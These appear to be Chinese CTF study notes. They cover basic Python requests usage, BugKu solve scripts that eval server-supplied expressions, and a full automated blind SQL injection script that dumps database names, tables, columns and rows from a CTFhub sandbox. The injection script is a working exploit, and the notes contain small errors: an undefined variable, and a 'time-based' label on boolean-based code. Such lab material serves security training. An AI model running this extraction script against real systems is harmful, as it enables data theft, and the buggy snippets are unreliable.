# Python专区





## requests专区



### 基本用法

```python
import requests

x = requests.get('https://baidu.com')

print(x.text)
```



GET请求：

```python
x = requests.get('https://www.baidu.com')
```

POST请求：

```python
x = requests.post('https://www.baidu.com', data = {'key':'value'})
```

put、delete、head、options请求同理







每一个requests请求都会返回一个response对象

```python
import requests

x = requests.get('https://www.baidu.com')

print(x.text)				#打印页面
print(response.status_code) # 获取响应状态码
print(response.headers)  	# 获取响应头
print(response.content)  	# 获取响应内容

print(x.status_code)		# 返回 http 的状态码
print(x.reason)				# 响应状态的描述
print(x.apparent_encoding)	# 返回编码

print(x.json())				# 返回 json 数据
```





设置请求头：

```python
# 导入 requests 包
import requests

kw = {'s':'python 教程'}

# 设置请求头
headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36"}
 
# params 接收一个字典或者字符串的查询参数，字典类型自动转换为url编码，不需要urlencode()
response = requests.get("https://www.runoob.com/", params = kw, headers = headers)

print (response.status_code)	# 查看响应状态码
print (response.encoding)		# 查看响应头部字符编码
print (response.url)			# 查看完整url地址
print(response.text)			# 查看响应内容，response.text 返回的是Unicode格式的数据
```



## Session漏洞



脚本伪造session，可以实现encode和decode

[noraj/flask-session-cookie-manager: :cookie: Flask Session Cookie Decoder/Encoder (github.com)](https://github.com/noraj/flask-session-cookie-manager)





## 序列化漏洞



## 格式化漏洞



## SSTI漏洞





## 题目

### BugKu-秋名山之神

就是一个计算式，算快点就有flag了

```python
import requests
import re

url = 'http://xxx.xxx.xxx.xx:xxxxx/'
session1 = requests.session()
resp= session1.get(url)
result = re.search(r'(\d+[+\-*])+(\d+)', resp.text)
res = result.group()
val = eval(res)
data = {'value': val}
flag = session1.post(url, data=data)
print(flag.text)
```



```python
#经常出现执行了但是不弹flag的情况，多试几次就行了

import requests   
import re         #导入请求模块 和 正则模块
url="http://123.206.87.240:8002/qiumingshan/"
r=requests.session()  #此题必须要创建会话对象Session()，否则提交结果的时候，重新生成了一个新的表达式，结果会错误
text=r.get(url).text  #将get到的数据以文本形式显示出来
cont=re.findall('<div>(.*?)</div>',text) 
                  # re模块的findall函数返回的是 正则表达式在字符串中所有匹配结果的 列表 ，利用正则将我们需要的表达式提取出来
                  
cont="".join(cont) #列表转字符串，因为eval()接收的参数类型为string, bytes or code object
cont=cont[:-3] #删掉多余的字符
post=eval(cont) #eval()可以把字符串当做有效表达式进行计算
data={'value':post}  #构造post数据
ans=r.post(url,data=data)
print(ans.text)  #以post方式发送我们获取到的value的值,再将响应的内容打印出来

```



```python
import requests
import re
 
url='''http://114.67.175.224:18471'''
 
#創建一個session,帮我们跨请求保持某些参数，也会在同一个session实例发出的所有请求之间保持cookies
session1=requests.session()
 
#获取返回数据包信息
response_get=session1.get(url)
 
#匹配1232131231-123123123-12312321算数表达式
result=re.search(r'(\d+[+\-*])+(\d+)',response_get.text)
#print(result)
 
#获得算数表达式匹配结果
expressions=result.group()
#eval()--执行()代码
myvalue=eval(expressions)
 
#创建一个字典
key = {'value':myvalue}
#用post方法传上去
flag=session1.post(url,data=key)
print(flag.text)
```







### SQL时间盲注

```python
import requests
from urllib.parse import quote

success_flag = "query_success" #成功查询到内容的关键字
base_url = "http://challenge-d41158772186d1b6.sandbox.ctfhub.com:10800/?id="
headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2", "Accept-Encoding": "gzip, deflate", "Connection": "close", "Upgrade-Insecure-Requests": "1"}

def get_database_length():
    global success_flag, base_url, headers, cookies
    length = 1
    while (1):
        id = "1 and length(database()) = " + str(length)
        url = base_url + quote(id) #很重要，因为id中有许多特殊字符，比如#，需要进行url编码
        response = requests.get(url, headers=headers).text
        if (success_flag not in response):
            print("database length", length, "failed!")
            length+=1
        else:
            print("database length", length, "success")
            print("payload:", id)
            break
    print("数据库名的长度为", length)
    return length

def get_database(database_length):
    global success_flag, base_url, headers, cookies
    database = ""
    for i in range(1, database_length + 1):
        l, r = 0, 127 #神奇的申明方法
        while (1):
            ascii = (l + r) // 2
            id_equal = "1 and ascii(substr(database(), " + str(i) + ", 1)) = " + str(ascii)
            response = requests.get(base_url + quote(id_equal), headers=headers).text
            if (success_flag in response):
                database += chr(ascii)
                print ("目前已知数据库名", database)
                break
            else:
                id_bigger = "1 and ascii(substr(database(), " + str(i) + ", 1)) > " + str(ascii)
                response = requests.get(base_url + quote(id_bigger), headers=headers).text
                if (success_flag in response):
                    l = ascii + 1
                else:
                    r = ascii - 1
    print("数据库名为", database)
    return database

def get_table_num(database):
    global success_flag, base_url, headers, cookies
    num = 1
    while (1):
        id = "1 and (select count(table_name) from information_schema.tables where table_schema = '" + database + "') = " + str(num)
        response = requests.get(base_url + quote(id), headers=headers).text
        if (success_flag in response):
            print("payload:", id)
            print("数据库中有", num, "个表")
            break
        else:
            num += 1
    return num

def get_table_length(index, database):
    global success_flag, base_url, headers, cookies
    length = 1
    while (1):
        id = "1 and (select length(table_name) from information_schema.tables where table_schema = '" + database + "' limit " + str(index) + ", 1) = " + str(length)
        response = requests.get(base_url + quote(id), headers=headers).text
        if (success_flag not in response):
            print("table length", length, "failed!")
            length+=1
        else:
            print("table length", length, "success")
            print("payload:", id)
            break
    print("数据表名的长度为", length)
    return length

def get_table(index, table_length, database):
    global success_flag, base_url, headers, cookies
    table = ""
    for i in range(1, table_length + 1):
        l, r = 0, 127 #神奇的申明方法
        while (1):
            ascii = (l + r) // 2
            id_equal = "1 and (select ascii(substr(table_name, " + str(i) + ", 1)) from information_schema.tables where table_schema = '" + database + "' limit " + str(index) + ",1) = " + str(ascii)
            response = requests.get(base_url + quote(id_equal), headers=headers).text
            if (success_flag in response):
                table += chr(ascii)
                print ("目前已知数据库名", table)
                break
            else:
                id_bigger = "1 and (select ascii(substr(table_name, " + str(i) + ", 1)) from information_schema.tables where table_schema = '" + database + "' limit " + str(index) + ",1) > " + str(ascii)
                response = requests.get(base_url + quote(id_bigger), headers=headers).text
                if (success_flag in response):
                    l = ascii + 1
                else:
                    r = ascii - 1
    print("数据表名为", table)
    return table

def get_column_num(table):
    global success_flag, base_url, headers, cookies
    num = 1
    while (1):
        id = "1 and (select count(column_name) from information_schema.columns where table_name = '" + table + "') = " + str(num)
        response = requests.get(base_url + quote(id), headers=headers).text
        if (success_flag in response):
            print("payload:", id)
            print("数据表", table, "中有", num, "个字段")
            break
        else:
            num += 1
    return num

def get_column_length(index, table):
    global success_flag, base_url, headers, cookies
    length = 1
    while (1):
        id = "1 and (select length(column_name) from information_schema.columns where table_name = '" + table + "' limit " + str(index) + ", 1) = " + str(length)
        response = requests.get(base_url + quote(id), headers=headers).text
        if (success_flag not in response):
            print("column length", length, "failed!")
            length+=1
        else:
            print("column length", length, "success")
            print("payload:", id)
            break
    print("数据表", table, "第", index, "个字段的长度为", length)
    return length

def get_column(index, column_length, table):
    global success_flag, base_url, headers, cookies
    column = ""
    for i in range(1, column_length + 1):
        l, r = 0, 127 #神奇的申明方法
        while (1):
            ascii = (l + r) // 2
            id_equal = "1 and (select ascii(substr(column_name, " + str(i) + ", 1)) from information_schema.columns where table_name = '" + table + "' limit " + str(index) + ",1) = " + str(ascii)
            response = requests.get(base_url + quote(id_equal), headers=headers).text
            if (success_flag in response):
                column += chr(ascii)
                print ("目前已知字段为", column)
                break
            else:
                id_bigger = "1 and (select ascii(substr(column_name, " + str(i) + ", 1)) from information_schema.columns where table_name = '" + table + "' limit " + str(index) + ",1) > " + str(ascii)
                response = requests.get(base_url + quote(id_bigger), headers=headers).text
                if (success_flag in response):
                    l = ascii + 1
                else:
                    r = ascii - 1
    print("数据表", table, "第", index, "个字段名为", column)
    return column

def get_flag_num(column, table):
    global success_flag, base_url, headers, cookies
    num = 1
    while (1):
        id = "1 and (select count(" + column + ") from " + table + ") = " + str(num)
        response = requests.get(base_url + quote(id), headers=headers).text
        if (success_flag in response):
            print("payload:", id)
            print("数据表", table, "中有", num, "行数据")
            break
        else:
            num += 1
    return num

def get_flag_length(index, column, table):
    global success_flag, base_url, headers, cookies
    length = 1
    while (1):
        id = "1 and (select length(" + column + ") from " + table + " limit " + str(index) + ", 1) = " + str(length)
        response = requests.get(base_url + quote(id), headers=headers).text
        if (success_flag not in response):
            print("flag length", length, "failed!")
            length+=1
        else:
            print("flag length", length, "success")
            print("payload:", id)
            break
    print("数据表", table, "第", index, "行数据的长度为", length)
    return length

def get_flag(index, flag_length, column, table):
    global success_flag, base_url, headers, cookies
    flag = ""
    for i in range(1, flag_length + 1):
        l, r = 0, 127 #神奇的申明方法
        while (1):
            ascii = (l + r) // 2
            id_equal = "1 and (select ascii(substr(" + column + ", " + str(i) + ", 1)) from " + table + " limit " + str(index) + ",1) = " + str(ascii)
            response = requests.get(base_url + quote(id_equal), headers=headers).text
            if (success_flag in response):
                flag += chr(ascii)
                print ("目前已知flag为", flag)
                break
            else:
                id_bigger = "1 and (select ascii(substr(" + column + ", " + str(i) + ", 1)) from " + table + " limit " + str(index) + ",1) > " + str(ascii)
                response = requests.get(base_url + quote(id_bigger), headers=headers).text
                if (success_flag in response):
                    l = ascii + 1
                else:
                    r = ascii - 1
    print("数据表", table, "第", index, "行数据为", flag)
    return flag

if __name__ == "__main__":
    print("---------------------")
    print("开始获取数据库名长度")
    database_length = get_database_length()
    print("---------------------")
    print("开始获取数据库名")
    database = get_database(database_length)
    print("---------------------")
    print("开始获取数据表的个数")
    table_num = get_table_num(database)
    tables = []
    print("---------------------")
    for i in range(0, table_num):
        print("开始获取第", i + 1, "个数据表的名称的长度")
        table_length = get_table_length(i, database)
        print("---------------------")
        print("开始获取第", i + 1, "个数据表的名称")
        table = get_table(i, table_length, database)
        tables.append(table)
    while(1): #在这个循环中可以进入所有的数据表一探究竟
        print("---------------------")
        print("现在得到了以下数据表", tables)
        table = input("请在这些数据表中选择一个目标: ")
        while( table not in tables ):
            print("你输入有误")
            table = input("请重新选择一个目标")
        print("---------------------")
        print("选择成功，开始获取数据表", table, "的字段数量")
        column_num = get_column_num(table)
        columns = []
        print("---------------------")
        for i in range(0, column_num):
            print("开始获取数据表", table, "第", i + 1, "个字段名称的长度")
            column_length = get_column_length(i, table)
            print("---------------------")
            print("开始获取数据表", table, "第", i + 1, "个字段的名称")
            column = get_column(i, column_length, table)
            columns.append(column)
        while(1): #在这个循环中可以获取当前选择数据表的所有字段记录
            print("---------------------")
            print("现在得到了数据表", table, "中的以下字段", columns)
            column = input("请在这些字段中选择一个目标: ")
            while( column not in columns ):
                print("你输入有误")
                column = input("请重新选择一个目标")
            print("---------------------")
            print("选择成功，开始获取数据表", table, "的记录数量")
            flag_num = get_flag_num(column, table)
            flags = []
            print("---------------------")
            for i in range(0, flag_num):
                print("开始获取数据表", table, "的", column, "字段的第", i + 1, "行记录的长度")
                flag_length = get_flag_length(i, column, table)
                print("---------------------")
                print("开始获取数据表", table, "的", column, "字段的第", i + 1, "行记录的内容")
                flag = get_flag(i, flag_length, column, table)
                flags.append(flag)
            print("---------------------")
            print("现在得到了数据表", table, "中", column, "字段中的以下记录", flags)
            quit = input("继续切换字段吗？(y/n)")
            if (quit == 'n' or quit == 'N'):
                break
            else:
                continue
        quit = input("继续切换数据表名吗？(y/n)")
        if (quit == 'n' or quit == 'N'):
            break
        else:
            continue
    print("bye~")

```







